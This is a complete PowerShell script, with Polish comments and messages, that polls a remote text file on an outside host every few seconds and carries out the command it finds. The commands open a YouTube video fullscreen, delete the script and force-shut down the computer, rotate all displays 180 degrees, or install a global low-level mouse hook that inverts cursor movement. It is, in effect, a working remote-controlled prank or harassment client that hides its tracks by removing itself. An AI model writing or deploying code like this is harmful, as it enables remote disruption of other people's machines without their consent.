$checkInterval = 5
$youtubeUrl = "https://www.youtube.com/watch?v=OaPNpvYTeI4"
$watchTime = 45
$url = "https://wkrgames.com/guslarz/pr/start.txt"
$scriptPath = $MyInvocation.MyCommand.Path
$youtubeStarted = $false
$mouseJobStarted = $false

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ConsoleHelper {
    [DllImport("kernel32.dll")] public static extern bool AllocConsole();
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@ -ErrorAction SilentlyContinue
[ConsoleHelper]::AllocConsole() | Out-Null
[ConsoleHelper]::ShowWindow([ConsoleHelper]::GetConsoleWindow(), 5) | Out-Null

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class R2 {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    public struct D {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
        public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
        public int dmFields, dmPositionX, dmPositionY, dmDisplayOrientation, dmDisplayFixedOutput;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    public struct DD {
        public int cb;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string DeviceName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceString;
        public int StateFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceID;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceKey;
    }
    [DllImport("user32.dll")] public static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DD lpDisplayDevice, uint dwFlags);
    [DllImport("user32.dll")] public static extern int EnumDisplaySettings(string name, int mode, ref D dev);
    [DllImport("user32.dll")] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref D lpDevMode, IntPtr hwnd, int dwFlags, IntPtr lParam);
}
"@ -ErrorAction SilentlyContinue

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Display {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct DEVMODE {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
        public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
        public uint dmFields;
        public int dmPositionX, dmPositionY;
        public uint dmDisplayOrientation, dmDisplayFixedOutput;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
        public short dmLogPixels;
        public uint dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    }
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwFlags, IntPtr lParam);
}
"@ -ErrorAction SilentlyContinue

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

public class MouseHook {
    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelMouseProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static volatile bool _active = false;
    private static volatile bool _busy = false;
    private static int _anchorX = -1;
    private static int _anchorY = -1;

    [StructLayout(LayoutKind.Sequential)]
    private struct MSLLHOOKSTRUCT {
        public int x, y;
        public uint mouseData, flags, time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam, lParam;
        public uint time;
        public int ptX, ptY;
    }

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] private static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] private static extern int GetSystemMetrics(int nIndex);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();
    [DllImport("user32.dll")] private static extern int GetMessage(out MSG m, IntPtr h, uint min, uint max);
    [DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint id, uint msg, IntPtr w, IntPtr l);

    private static Thread _thread;
    private static uint _tid;

    public static void Start() {
        if (_active) return;
        _active = true;
        _busy = false;
        _anchorX = -1;
        _anchorY = -1;

        _thread = new Thread(() => {
            _tid = GetCurrentThreadId();
            using (var p = Process.GetCurrentProcess())
            using (var m = p.MainModule)
                _hookID = SetWindowsHookEx(14, _proc, GetModuleHandle(m.ModuleName), 0);

            MSG msg;
            while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
            if (_hookID != IntPtr.Zero) UnhookWindowsHookEx(_hookID);
        });
        _thread.IsBackground = true;
        _thread.Start();
        Thread.Sleep(150);
    }

    public static void Stop() {
        _active = false;
        _anchorX = -1;
        _anchorY = -1;
        if (_tid != 0) PostThreadMessage(_tid, 0x0012, IntPtr.Zero, IntPtr.Zero);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (int)wParam == 0x0200 && _active && !_busy) {
            _busy = true;
            var hs = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));

            // Pierwszy event — zapamiętaj pozycję jako kotwicę, nie ruszaj kursora
            if (_anchorX == -1) {
                _anchorX = hs.x;
                _anchorY = hs.y;
                _busy = false;
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            int dx = hs.x - _anchorX;
            int dy = hs.y - _anchorY;

            if (dx != 0 || dy != 0) {
                int screenW = GetSystemMetrics(0);
                int screenH = GetSystemMetrics(1);

                int newX = _anchorX - dx;
                int newY = _anchorY - dy;

                // Ogranicz do granic ekranu
                if (newX < 0)           { _anchorX += (-newX); newX = 0; }
                if (newY < 0)           { _anchorY += (-newY); newY = 0; }
                if (newX >= screenW)    { _anchorX -= (newX - screenW + 1); newX = screenW - 1; }
                if (newY >= screenH)    { _anchorY -= (newY - screenH + 1); newY = screenH - 1; }

                SetCursorPos(newX, newY);
                _anchorX = newX;
                _anchorY = newY;

                _busy = false;
                return (IntPtr)1; // blokuj oryginał
            }

            _busy = false;
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@ -ErrorAction SilentlyContinue

function Set-AllRotations($rot) {
    $rotNames = @{0="Normalny (0)"; 1="90 stopni"; 2="180 stopni"; 3="270 stopni"}
    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Ustawianie obrotu: $($rotNames[$rot])" -ForegroundColor Cyan

    $changeResults = @{
        0  = "SUKCES"
        1  = "SUKCES - wymagany restart"
       -1  = "BLAD - ogolny blad"
       -2  = "BLAD - nieprawidlowy tryb"
       -3  = "BLAD - sterownik nie obsluguje"
       -4  = "BLAD - brak uprawnien (uruchom jako Admin!)"
    }

    Write-Host "  [Metoda 1] EnumDisplayDevices..." -ForegroundColor Gray
    $iDev = 0
    $found = 0
    while ($true) {
        $dd = New-Object R2+DD
        $dd.cb = [Runtime.InteropServices.Marshal]::SizeOf($dd)
        $ok = [R2]::EnumDisplayDevices($null, $iDev, [ref]$dd, 0)
        if (-not $ok) { break }
        Write-Host "    [$iDev] '$($dd.DeviceName)' StateFlags=$($dd.StateFlags)" -ForegroundColor Gray

        if ($dd.StateFlags -band 1) {
            $found++
            $devName = $dd.DeviceName
            $d = New-Object R2+D
            $d.dmSize = [Runtime.InteropServices.Marshal]::SizeOf($d)
            $enumResult = [R2]::EnumDisplaySettings($devName, -1, [ref]$d)
            Write-Host "    EnumDisplaySettings wynik: $enumResult | $($d.dmPelsWidth)x$($d.dmPelsHeight) | Obrot: $($d.dmDisplayOrientation)" -ForegroundColor Gray

            if ($enumResult -ne 0) {
                $d.dmDisplayOrientation = $rot
                $d.dmFields = 0x80
                $result = [R2]::ChangeDisplaySettingsEx($devName, [ref]$d, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                $msg = if ($changeResults.ContainsKey($result)) { $changeResults[$result] } else { "Nieznany kod: $result" }
                $color = if ($result -eq 0 -or $result -eq 1) { "Green" } else { "Red" }
                Write-Host "    Monitor $found ($devName): $msg" -ForegroundColor $color
            }
        }
        $iDev++
    }

    if ($found -eq 0) {
        Write-Host "  [Metoda 1] Brak aktywnych monitorow, próbuje Metoda 2..." -ForegroundColor Yellow

        Write-Host "  [Metoda 2] Display+DEVMODE na null..." -ForegroundColor Gray
        $d = New-Object Display+DEVMODE
        $d.dmSize = [short][Runtime.InteropServices.Marshal]::SizeOf($d)
        $ok = [Display]::EnumDisplaySettings($null, -1, [ref]$d)
        Write-Host "    EnumDisplaySettings(null): $ok | $($d.dmPelsWidth)x$($d.dmPelsHeight) | Obrot: $($d.dmDisplayOrientation)" -ForegroundColor Yellow

        if ($ok) {
            $d.dmDisplayOrientation = [uint32]$rot
            $d.dmFields = [uint32]0x80
            $result = [Display]::ChangeDisplaySettingsEx($null, [ref]$d, [IntPtr]::Zero, 0, [IntPtr]::Zero)
            $msg = if ($changeResults.ContainsKey([int]$result)) { $changeResults[[int]$result] } else { "Nieznany kod: $result" }
            $color = if ($result -eq 0 -or $result -eq 1) { "Green" } else { "Red" }
            Write-Host "    Wynik: $msg" -ForegroundColor $color
        } else {
            Write-Host "    BLAD: EnumDisplaySettings(null) tez nie dziala!" -ForegroundColor Red
        }

        Write-Host "  [Metoda 3] Proba przez \\.\DISPLAY1..." -ForegroundColor Gray
        foreach ($dispName in @("\\.\DISPLAY1","\\.\DISPLAY2","\\.\DISPLAY3")) {
            $d2 = New-Object Display+DEVMODE
            $d2.dmSize = [short][Runtime.InteropServices.Marshal]::SizeOf($d2)
            $ok2 = [Display]::EnumDisplaySettings($dispName, -1, [ref]$d2)
            if ($ok2) {
                Write-Host "    $dispName`: $($d2.dmPelsWidth)x$($d2.dmPelsHeight) | Obrot: $($d2.dmDisplayOrientation)" -ForegroundColor Green
                $d2.dmDisplayOrientation = [uint32]$rot
                $d2.dmFields = [uint32]0x80
                $result = [Display]::ChangeDisplaySettingsEx($dispName, [ref]$d2, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                $msg = if ($changeResults.ContainsKey([int]$result)) { $changeResults[[int]$result] } else { "Nieznany kod: $result" }
                $color = if ($result -eq 0 -or $result -eq 1) { "Green" } else { "Red" }
                Write-Host "    Wynik: $msg" -ForegroundColor $color
            } else {
                Write-Host "    $dispName`: brak" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "  Lacznie monitorow: $found`n" -ForegroundColor Gray
    }
}

function Start-MouseInversion {
    [MouseHook]::Start()
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Hook myszki aktywny (SendInput, bez lagu)" -ForegroundColor Green
}

function Stop-MouseInversion {
    [MouseHook]::Stop()
}

Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Skrypt uruchomiony. Monitoruje: $url" -ForegroundColor Green

while ($true) {
    try {
        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
        $value = $content.Content.Trim()
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Odczytano wartosc: '$value'" -ForegroundColor Gray
    } catch {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] BLAD pobierania URL: $_" -ForegroundColor Red
        Start-Sleep $checkInterval
        continue
    }

    if ($value -ne "2") {
        $youtubeStarted = $false
    }

    switch ($value) {
        "1" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [1] Uruchamiam YT, czekam $watchTime s, potem wylaczam PC" -ForegroundColor Yellow
            Start-Process $youtubeUrl
            Start-Sleep 5
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")
            Start-Sleep $watchTime
            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
            Stop-Computer -Force
        }
        "2" {
            if (-not $youtubeStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] Uruchamiam YT" -ForegroundColor Yellow
                Start-Process $youtubeUrl
                Start-Sleep 5
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.SendKeys]::SendWait("f")
                $youtubeStarted = $true
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] YT uruchomiony" -ForegroundColor Green
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] YT juz uruchomiony, pomijam" -ForegroundColor Gray
            }
        }
        "3" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [3] Wylaczam PC" -ForegroundColor Red
            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
            Stop-Computer -Force
        }
        "4" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [4] Obracam ekrany o 180" -ForegroundColor Magenta
            Set-AllRotations 2
        }
        "5" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [5] Przywracam normalny obrot" -ForegroundColor Magenta
            Set-AllRotations 0
        }
        "6" {
            if (-not $mouseJobStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [6] Odwracam sterowanie myszka" -ForegroundColor Magenta
                Start-MouseInversion
                $mouseJobStarted = $true
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [6] Inwersja myszki juz aktywna, pomijam" -ForegroundColor Gray
            }
        }
        "7" {
            if ($mouseJobStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [7] Przywracam normalne sterowanie myszka" -ForegroundColor Magenta
                Stop-MouseInversion
                $mouseJobStarted = $false
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Myszka przywrocona do normy" -ForegroundColor Green
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [7] Inwersja myszki nie byla aktywna" -ForegroundColor Gray
            }
        }
        default {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Nieznana wartosc: '$value', czekam..." -ForegroundColor DarkGray
        }
    }

    Start-Sleep $checkInterval
}
